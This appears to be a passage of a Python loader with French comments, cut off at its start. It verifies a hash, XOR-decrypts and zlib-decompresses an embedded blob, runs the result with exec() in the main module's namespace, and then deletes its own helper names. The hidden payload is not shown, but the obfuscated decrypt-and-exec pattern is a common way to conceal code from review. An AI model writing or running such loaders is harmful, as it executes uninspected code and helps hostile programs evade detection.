_cm2D__Qht0LVjl + _chGztuzSllhhnB + _cjYtjFF1FEvExb + _cxmhhIB_aAbUF5 + _cbOShm_aKvF3Gl + _coG4J3Dti1uxwY + _c_xClXzsb6gHQn + _cmeeAW1fKZMpt1 + _ca3HRDbXa2E8rF + _cqUHefoSj0bX4F + _cqZNS6yKgShMpb + _cxj87WqoHPO0A8 + _cjQis1gfmqmx7B + _clrwNrgrJpDTRj + _cuSvGC5Yais54I + _czdwdyS6XYRwRb + _ctmatbHB6Uf_2f + _cisP30hwHf_A0i)
if __import__('hashlib').sha256(_pdHXRDp7qvoMVU).hexdigest() != '741d5e859ea405e2987e19cd3125bd3d0a35e8c71deee8208a0625e5bedc60bd':
    __import__('sys').exit(1)
_xl2Vk7NyhvfKGJ = bytes([85, 190, 93, 127, 237, 83, 16, 46, 50, 181, 210, 208, 185, 145, 108, 247])
_fkhLpP7PhQZXdFV = bytes([87, 22, 36, 97, 77, 121, 237, 149, 128, 99, 237, 161, 29, 99, 63, 63])

def _fxiMtrjf8731LPi(_bejwj3Gw5cZb8C, _kx6pUJ8j23tEt0):
    return bytes(_bejwj3Gw5cZb8C[_id2Jpl47FSF6ee] ^ _kx6pUJ8j23tEt0[_id2Jpl47FSF6ee % len(_kx6pUJ8j23tEt0)] for _id2Jpl47FSF6ee in range(len(_bejwj3Gw5cZb8C)))

def _fdy4WdZwNWh4iAj(_tmFB4t8FeV7x6I):
    import zlib
    return zlib.decompress(_tmFB4t8FeV7x6I) # Un seul niveau de zlib ici pour simplifier

def _fepA59T0jLOSXsl():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xn4htljSTn4Zgh = _fxiMtrjf8731LPi(_pdHXRDp7qvoMVU, _xl2Vk7NyhvfKGJ)
    # 2. Décompression Zlib
    _dtcsyJ_6yZtAk1 = _fdy4WdZwNWh4iAj(_xn4htljSTn4Zgh)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtcsyJ_6yZtAk1.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nzSzzv8n2kyk_w = _main.__dict__
    _nzSzzv8n2kyk_w.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nzSzzv8n2kyk_w)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fepA59T0jLOSXsl()
try:
    del _fxiMtrjf8731LPi, _fdy4WdZwNWh4iAj, _fepA59T0jLOSXsl
    del _pdHXRDp7qvoMVU, _xl2Vk7NyhvfKGJ, _fkhLpP7PhQZXdFV
except:
    pass
